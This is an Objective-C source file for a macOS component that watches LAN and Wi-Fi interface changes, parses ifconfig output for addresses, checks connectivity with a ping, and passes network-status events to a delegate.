//
//  NetworkConnectionCaptureNotify.m
//  NetworkChangeCaptureManager
//
//  Created by ophat on 6/8/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//
#include <stdio.h>
#include <ifaddrs.h>
#include <arpa/inet.h>

#import "NetworkConnectionCaptureNotify.h"
#import "FxNetworkConnectionMacOSEvent.h"
#import "DateTimeFormat.h"
#import "SystemUtilsImpl.h"

#import <SystemConfiguration/SystemConfiguration.h>
#import <CoreWLAN/CoreWLAN.h>


#define kInternetTypeLan  1
#define kInternetTypeWifi 2

@implementation NetworkConnectionCaptureNotify
@synthesize mCFRunLoop1;
@synthesize mCFRunLoopSrc1;
@synthesize mCFRunLoop2;
@synthesize mCFRunLoopSrc2;
@synthesize mDelegate,mSelector,mThread;
@synthesize mHistory;
@synthesize mNetworkWifiNameKeeper;

NetworkConnectionCaptureNotify * _NetworkConnectionCaptureNotify;

void Callback_NetworkConnection_Wifi(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx);
void Callback_NetworkConnection_Lan(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx);

#pragma mark -### Controller
- (void) startCapture {
    if (!mHistory) {
        mHistory = [[NSMutableArray alloc]init];
    }
    _NetworkConnectionCaptureNotify = self;
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        [self startCaptureWifi];
    });
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        [self startCaptureLan];
    });
}

- (void) stopCapture {
    [self stopCaptureWifi];
    [self stopCaptureLan];
}

#pragma mark -### Wifi Controller
- (void) startCaptureWifi {
    [self stopCaptureWifi];
    DLog(@"startCaptureWifi ==> start");

    self.mNetworkWifiNameKeeper = [[CWInterface interfaceWithName:@"en1"] ssid];
    
    NSMutableArray *scKeys = [[NSMutableArray alloc] init];
    [scKeys addObject:@"State:/Network/Interface/en1/IPv4"];
    
    SCDynamicStoreContext ctx = { 0, NULL, NULL, NULL, NULL };
    SCDynamicStoreRef store = SCDynamicStoreCreate(kCFAllocatorDefault,nil, Callback_NetworkConnection_Wifi, &ctx);
    if (store == NULL) {
        [scKeys release];
        return;
    }
    
    SCDynamicStoreSetNotificationKeys(store, (__bridge CFArrayRef)scKeys,  NULL);
    
    [scKeys release];
    
    mCFRunLoop1 = CFRunLoopGetCurrent();
    mCFRunLoopSrc1 = SCDynamicStoreCreateRunLoopSource(NULL, store, 0);
    CFRunLoopAddSource( mCFRunLoop1 , mCFRunLoopSrc1, kCFRunLoopDefaultMode);
    [[NSRunLoop currentRunLoop] run];
    
    CFRelease(store);
}

- (void) stopCaptureWifi{
    DLog(@"stopCaptureWifi ==> stop");
    if (mCFRunLoop1 != nil && mCFRunLoopSrc1 != nil) {
        CFRunLoopRemoveSource(mCFRunLoop1, mCFRunLoopSrc1, kCFRunLoopDefaultMode);
        CFRunLoopStop(mCFRunLoop1);
        mCFRunLoopSrc1 = nil;
        mCFRunLoop1 = nil;
    }
}

void Callback_NetworkConnection_Wifi(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx){
    [(__bridge NSArray *)changedKeys enumerateObjectsUsingBlock:^(NSString *key, NSUInteger idx, BOOL *stop) {
        NSString *adapterName = [key componentsSeparatedByString:@"/"][3];
        DLog(@"adapterName",adapterName);
        CWInterface *interface = [CWInterface interfaceWithName:adapterName];

        NSMutableArray * arg = [[NSMutableArray alloc]init];
        [arg addObject:@"WIFI"];
        [arg addObject:adapterName];
        if ([interface ssid]) {
            [arg addObject:[interface ssid]];
        }else{
            [arg addObject:@""];
        }
        
        [NSObject cancelPreviousPerformRequestsWithTarget:_NetworkConnectionCaptureNotify];
        [_NetworkConnectionCaptureNotify performSelector:@selector(getStatus:) withObject:arg afterDelay:1];
        [arg release];

    }];
}

#pragma mark -### LAN Controller
- (void) startCaptureLan {
    DLog(@"startCaptureLan ==> start");
    
    NSMutableArray *scKeys = [[NSMutableArray alloc] init];
    [scKeys addObject:@"State:/Network/Interface/en0/IPv4"];
    
    SCDynamicStoreContext ctx = { 0, NULL, NULL, NULL, NULL };
    SCDynamicStoreRef store = SCDynamicStoreCreate(kCFAllocatorDefault,nil, Callback_NetworkConnection_Lan, &ctx);
    if (store == NULL) {
        [scKeys release];
        return;
    }
    
    SCDynamicStoreSetNotificationKeys(store, (__bridge CFArrayRef)scKeys,  NULL);
    
    [scKeys release];
    
    mCFRunLoop2 = CFRunLoopGetCurrent();
    mCFRunLoopSrc2 = SCDynamicStoreCreateRunLoopSource(NULL, store, 0);
    CFRunLoopAddSource(mCFRunLoop2, mCFRunLoopSrc2, kCFRunLoopDefaultMode);
    [[NSRunLoop currentRunLoop] run];
    
    CFRelease(store);
}

- (void) stopCaptureLan{
    DLog(@"stopCaptureLan ==> stop");
    if (mCFRunLoop2 != nil && mCFRunLoopSrc2 != nil) {
        CFRunLoopRemoveSource(mCFRunLoop2, mCFRunLoopSrc2, kCFRunLoopDefaultMode);
        CFRunLoopStop(mCFRunLoop2);
        mCFRunLoopSrc2 = nil;
        mCFRunLoop2 = nil;
    }
}

void Callback_NetworkConnection_Lan(SCDynamicStoreRef store, CFArrayRef changedKeys, void *ctx){
    [(__bridge NSArray *)changedKeys enumerateObjectsUsingBlock:^(NSString *key, NSUInteger idx, BOOL *stop) {
        NSString *adapterName = [key componentsSeparatedByString:@"/"][3];
        if ([adapterName length]>0) {
            NSMutableArray * arg = [[NSMutableArray alloc]init];
            [arg addObject:@"LAN"];
            [arg addObject:adapterName];

            [NSObject cancelPreviousPerformRequestsWithTarget:_NetworkConnectionCaptureNotify];
            [_NetworkConnectionCaptureNotify performSelector:@selector(getStatus:) withObject:arg afterDelay:1];
            [arg release];
        }
    }];
}
#pragma mark ### GET Utility

- (NSString * )getCurrentIPAddressByType:(int) aType {
    NSString * IP = @"";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    success = getifaddrs(&interfaces);
    if (success == 0) {
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                if (aType == kInternetTypeLan) {
                    if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                        IP = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    }
                }else{
                    if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en1"]) {
                        IP = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    }
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    freeifaddrs(interfaces);
    return IP;
}
    
#pragma mark -###GetStatus
- (BOOL) isInternetAvailableForThisType:(int )aType{
    BOOL isInternetAvailable = false;
    NSString * testPing ;
    testPing = [self runAsCommand: [NSString stringWithFormat:@"ping -c 1 -S %@ www.google.com", [self getCurrentIPAddressByType:aType]]];
    testPing = [testPing stringByReplacingOccurrencesOfString:@" " withString:@""];
    if ([testPing length] > 0) {
        isInternetAvailable = true;
    }
    
    return isInternetAvailable;
}
- (void) getStatus :(NSMutableArray *)aArg {
    
    NSString * result = [_NetworkConnectionCaptureNotify runAsCommand:@"ifconfig"];
    NSString * from = [NSString stringWithFormat:@"%@",[aArg objectAtIndex:0]];
    NSString * adapterName = [NSString stringWithFormat:@"%@",[aArg objectAtIndex:1]];
    BOOL isInternetAvailable = false;

    NSString * networkName = @"";
    NSString * macAddress = @"";
    NSString * Ipv4 = @"";
    NSString * Ipv6 = @"";
    NSString * subnetMask = @"";
    NSString * gateway = @"";
    Boolean isActive = false;
    
    if ([from isEqualToString:@"WIFI"] && [aArg count] == 3) {
        networkName = [NSString stringWithFormat:@"%@",[aArg objectAtIndex:2]];
    }
  
    if ([result rangeOfString:[NSString stringWithFormat:@"%@: ",adapterName]].location !=NSNotFound) {
        NSArray * spliter = [result componentsSeparatedByString:[NSString stringWithFormat:@"%@: ",adapterName]];
        spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@": flags="];
        if ([[spliter objectAtIndex:0]rangeOfString:@"status: active"].location !=NSNotFound) {
            isActive = true;
        }else if ([[spliter objectAtIndex:0]rangeOfString:@"status: inactive"].location !=NSNotFound) {
            isActive = false;
        }
        
        NSString * info = [spliter objectAtIndex:0];
        if (info) {

            if ([info rangeOfString:@"ether "].location != NSNotFound) {
                spliter = [info componentsSeparatedByString:@"ether "];
                spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"\n"];
                macAddress = [spliter objectAtIndex:0];
                macAddress = [macAddress stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceAndNewlineCharacterSet]];
            }
            
            if ([info rangeOfString:@"inet6 "].location != NSNotFound) {
                spliter = [info componentsSeparatedByString:@"inet6 "];
                NSString * ender = [NSString stringWithFormat:@"%%%@",adapterName];
                spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:ender];
                Ipv6 = [spliter objectAtIndex:0];
            }
            
            if ([info rangeOfString:@"inet "].location != NSNotFound) {
                spliter = [info componentsSeparatedByString:@"inet "];
                spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"netmask"];
                Ipv4 = [spliter objectAtIndex:0];
            }
            
            if ([info rangeOfString:@"netmask "].location != NSNotFound) {
                spliter = [info componentsSeparatedByString:@"netmask "];
                spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"broadcast"];
                subnetMask = [spliter objectAtIndex:0];
                subnetMask = [subnetMask stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceAndNewlineCharacterSet]];
                subnetMask = [self convertSubnetToDecimal:subnetMask];
            }
            if ([info rangeOfString:@"broadcast "].location != NSNotFound) {
                spliter = [info componentsSeparatedByString:@"broadcast "];
                spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"\n"];
                gateway = [spliter objectAtIndex:0];
                gateway = [gateway stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceAndNewlineCharacterSet]];
            }
            
            if ([from isEqualToString:@"LAN"] && isActive && [Ipv4 length] > 0) {
                isInternetAvailable =[self isInternetAvailableForThisType:kInternetTypeLan];
            }else if ([from isEqualToString:@"WIFI"] && isActive) {
                isInternetAvailable = [self isInternetAvailableForThisType:kInternetTypeWifi];
            }

            if ([mDelegate respondsToSelector:mSelector]) {
                
                if ([adapterName isEqualToString:@"en0"]) {
                    networkName = @"LAN";
                }
                
                if (isActive && [adapterName isEqualToString:@"en1"]) {
                    self.mNetworkWifiNameKeeper = networkName;
                }else  if ( !isActive && [adapterName isEqualToString:@"en1"]) {
                    networkName =  self.mNetworkWifiNameKeeper;
                }
                
                if (( isActive && [Ipv4 length] > 0 && [Ipv6 length] > 0) ||
                    (!isActive && [Ipv4 length] ==0 && [Ipv6 length] ==0) ){

                    NSString * historyLine = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%@-%@-%@-%@-%@-%@-%@-%@-%d-%d-%@",from,adapterName,networkName,macAddress,Ipv4,Ipv6,subnetMask,gateway,isInternetAvailable,isActive,[DateTimeFormat phoenixDateTime]]];
                    if (! [mHistory containsObject:historyLine]) {
                        
                        [mHistory addObject:historyLine];
                        DLog(@"############ Network Status Change");
                        DLog(@"# { %@ }",from);
                        DLog(@"# AdapterName { %@ }",adapterName);
                        DLog(@"# NetworkName { %@ }",networkName);
                        DLog(@"# MacAddress  { %@ }",macAddress);
                        DLog(@"# Ipv6 { %@ }",Ipv6);
                        DLog(@"# Ipv4 { %@ }",Ipv4);
                        DLog(@"# subnetMask { %@ }",subnetMask);
                        DLog(@"# gateway { %@ }",gateway);
                        DLog(@"# isInternetAvailable { %d }",isInternetAvailable);
                        DLog(@"# isActive { %d }",isActive);
                        DLog(@"##################################");
                        
                        FxNetworkConnectionMacOSEvent * event = [[[FxNetworkConnectionMacOSEvent alloc]init] autorelease];
                        [event setDateTime:[DateTimeFormat phoenixDateTime]];
                        [event setMUserLogonName:[SystemUtilsImpl userLogonName]];
                        [event setMApplicationName:@""];
                        [event setMApplicationID:@""];
                        [event setMTitle:@""];
                        
                        FxNetworkAdapter * adapter = [[FxNetworkAdapter alloc]init];
                        [adapter setMUID:@""];
                        if ([from isEqualToString:@"WIFI"]) {
                            [adapter setMNetworkType:kNetworkTypeWifi];
                        }else{
                            [adapter setMNetworkType:kNetworkTypeWired];
                        }
                        [adapter setMName:adapterName];
                        [adapter setMDescription:@""];
                        [adapter setMMACAddress:macAddress];
                        [event setMAdapter:adapter];
                        [adapter release];
                        
                        FxNetworkAdapterStatus *status = [[FxNetworkAdapterStatus alloc]init];
                        if (isActive == 1) {
                            [status setMState:kNetworkAdapterConnected];
                        }else{
                            [status setMState:kNetworkAdapterDisconnected];
                        }

                        [status setMNetworkName:networkName];
                        [status setMIPv4:Ipv4];
                        [status setMIPv6:Ipv6];
                        [status setMSubnetMaskAddress:subnetMask];
                        [status setMDefaultGateway:gateway];
                        [status setMDHCP:0];
                        [event setMAdapterStatus:status];
                        [status release];
                        
                        [mDelegate performSelector:mSelector onThread:mThread withObject:event waitUntilDone:NO];
                    }else{
                        DLog(@"#### Duplicate NetworkConnection");
                    }
                    [historyLine release];
                }
            }
        }
    }
}

- (NSString*)runAsCommand :(NSString *)aCmd{
    
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
    
    NSPipe* pipe = [NSPipe pipe];
    NSTask* task = [[NSTask alloc] init];
    [task setLaunchPath: @"/bin/sh"];
    [task setArguments:@[@"-c", aCmd]];
    [task setStandardOutput:pipe];
    
    NSFileHandle* file = [pipe fileHandleForReading];
    [task launch];
    
    NSData *data = [file readDataToEndOfFile];
    
    [task waitUntilExit];
    [task release];
    
    NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    [file closeFile];
    
    [pool drain];
    
    return [result autorelease];
}

-(NSString *) convertSubnetToDecimal:(NSString *) aHex{
    NSString * subnetMask =@"";
    NSString * temp = aHex;
    for (int i = 2; i < [aHex length] ; i += 2) {
        NSRange range = NSMakeRange(i,2);
        NSString *subtemp = [temp substringWithRange:range];
        unsigned int decimalValue;
        NSScanner* scanner = [NSScanner scannerWithString:subtemp];
        [scanner scanHexInt:&decimalValue];
        if ([subnetMask length]>0) {
            subnetMask = [NSString stringWithFormat:@"%@.%u",subnetMask,decimalValue];
        }else{
            subnetMask = [NSString stringWithFormat:@"%u",decimalValue];
        }
    }
    return subnetMask;
}

-(void)dealloc{
    [mThread release];
    [mNetworkWifiNameKeeper release];
    [super dealloc];
}
@end
